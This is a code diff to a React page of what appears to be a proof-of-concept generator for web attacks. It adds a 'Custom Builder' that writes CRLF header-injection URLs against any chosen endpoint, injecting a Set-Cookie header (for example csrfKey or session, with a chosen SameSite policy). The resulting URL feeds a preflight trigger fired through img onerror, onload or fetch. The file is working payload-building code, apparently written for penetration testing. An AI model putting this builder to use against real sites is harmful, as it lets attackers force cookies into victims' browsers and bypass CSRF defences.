@@ -11,6 +11,7 @@ import {
   Sparkles,
   Terminal,
   ExternalLink,
+  Wrench,
 } from 'lucide-react';
 import { useApp } from '../context';
 import { compilePoc } from '../lib/generator';
@@ -36,7 +37,32 @@ export function GeneratorPage() {
   const [preflightEnabled, setPreflightEnabled] = useState(false);
   const [preflightUrl, setPreflightUrl] = useState('');
   const [preflightTrigger, setPreflightTrigger] = useState<'onerror' | 'onload' | 'fetch'>('onerror');
+  const [showBuilder, setShowBuilder] = useState(false);
+  const [builderEndpoint, setBuilderEndpoint] = useState('');
+  const [builderParam, setBuilderParam] = useState('search');
+  const [builderCookieName, setBuilderCookieName] = useState('csrfKey');
+  const [builderCookieVal, setBuilderCookieVal] = useState('YOUR-KEY');
+  const [builderSameSite, setBuilderSameSite] = useState<
+    'SameSite=None' | 'SameSite=Lax' | 'SameSite=Strict' | 'none'
+  >('SameSite=None');
   const [copied, setCopied] = useState(false);
+
+  const getRequestBaseUrl = (): string => {
+    if (!currentRequest?.url) return 'https://target.com/search';
+    const parts = currentRequest.url.split('?');
+    return (parts.length > 0 && parts[0]) ? parts[0] : currentRequest.url;
+  };
+
+  const handleApplyBuilder = () => {
+    const base = (builderEndpoint || getRequestBaseUrl()).trim();
+    const param = (builderParam || 'search').trim();
+    const cName = (builderCookieName || 'csrfKey').trim();
+    const cVal = (builderCookieVal || 'YOUR-KEY').trim();
+    const sSite = builderSameSite !== 'none' ? `%3b%20${builderSameSite}` : '';
+
+    const constructed = `${base}?${encodeURIComponent(param)}=test%0d%0aSet-Cookie:%20${encodeURIComponent(cName)}=${encodeURIComponent(cVal)}${sSite}`;
+    setPreflightUrl(constructed);
+  };
 
   const compiledPoc = useMemo(() => {
     if (!currentRequest) return null;
@@ -376,9 +402,100 @@ export function GeneratorPage() {
                           placeholder="https://victim.com/?search=x%0d%0aSet-Cookie:..."
                           className="w-full bg-dark-900 border border-dark-700/80 rounded px-2 py-1 text-xs text-dark-100 placeholder-dark-600 focus:outline-none focus:border-cyber-500 font-mono"
                         />
-                        <p className="text-[10px] text-dark-500 font-sans mt-0.5">
-                          Paste a raw CRLF URL or full &lt;img src=&quot;...&quot;&gt; tag.
-                        </p>
+                        <div className="flex items-center justify-between mt-1">
+                          <p className="text-[10px] text-dark-500 font-sans">
+                            Paste URL or use custom builder below.
+                          </p>
+                          <button
+                            type="button"
+                            onClick={() => {
+                              if (!builderEndpoint && currentRequest?.url) {
+                                setBuilderEndpoint(getRequestBaseUrl());
+                              }
+                              setShowBuilder(!showBuilder);
+                            }}
+                            className="text-[10px] text-cyber-400 hover:text-cyber-300 font-medium flex items-center gap-1"
+                          >
+                            <Wrench className="w-2.5 h-2.5" />
+                            {showBuilder ? 'Close Builder' : 'Custom Builder'}
+                          </button>
+                        </div>
+
+                        {showBuilder && (
+                          <div className="mt-2 p-2 bg-dark-900 border border-dark-700/70 rounded space-y-2 text-[11px]">
+                            <p className="text-dark-400 text-[10px]">
+                              Construct custom CRLF payload for any target endpoint:
+                            </p>
+                            <div>
+                              <label className="text-dark-300 block mb-0.5">Target Endpoint:</label>
+                              <input
+                                type="text"
+                                value={builderEndpoint}
+                                onChange={(e) => setBuilderEndpoint(e.target.value)}
+                                placeholder={currentRequest?.url?.split('?')[0] || 'https://target.com/search'}
+                                className="w-full bg-dark-950 border border-dark-800 rounded px-2 py-1 text-xs text-dark-200 font-mono"
+                              />
+                            </div>
+                            <div className="grid grid-cols-2 gap-2">
+                              <div>
+                                <label className="text-dark-300 block mb-0.5">Parameter:</label>
+                                <input
+                                  type="text"
+                                  value={builderParam}
+                                  onChange={(e) => setBuilderParam(e.target.value)}
+                                  placeholder="search, q, redirect, etc."
+                                  className="w-full bg-dark-950 border border-dark-800 rounded px-2 py-1 text-xs text-dark-200 font-mono"
+                                />
+                              </div>
+                              <div>
+                                <label className="text-dark-300 block mb-0.5">Cookie Name:</label>
+                                <input
+                                  type="text"
+                                  value={builderCookieName}
+                                  onChange={(e) => setBuilderCookieName(e.target.value)}
+                                  placeholder="csrfKey, session, etc."
+                                  className="w-full bg-dark-950 border border-dark-800 rounded px-2 py-1 text-xs text-dark-200 font-mono"
+                                />
+                              </div>
+                            </div>
+                            <div className="grid grid-cols-2 gap-2">
+                              <div>
+                                <label className="text-dark-300 block mb-0.5">Cookie Value:</label>
+                                <input
+                                  type="text"
+                                  value={builderCookieVal}
+                                  onChange={(e) => setBuilderCookieVal(e.target.value)}
+                                  placeholder="YOUR-KEY"
+                                  className="w-full bg-dark-950 border border-dark-800 rounded px-2 py-1 text-xs text-dark-200 font-mono"
+                                />
+                              </div>
+                              <div>
+                                <label className="text-dark-300 block mb-0.5">SameSite Policy:</label>
+                                <select
+                                  value={builderSameSite}
+                                  onChange={(e) =>
+                                    setBuilderSameSite(e.target.value as typeof builderSameSite)
+                                  }
+                                  className="w-full bg-dark-950 border border-dark-800 rounded px-2 py-1 text-xs text-dark-200"
+                                >
+                                  <option value="SameSite=None">SameSite=None</option>
+                                  <option value="SameSite=Lax">SameSite=Lax</option>
+                                  <option value="SameSite=Strict">SameSite=Strict</option>
+                                  <option value="none">Omit SameSite</option>
+                                </select>
+                              </div>
+                            </div>
+                            <Button
+                              type="button"
+                              variant="secondary"
+                              size="sm"
+                              onClick={handleApplyBuilder}
+                              className="w-full mt-1"
+                            >
+                              Generate & Apply URL
+                            </Button>
+                          </div>
+                        )}
                       </div>
 
                       <div>
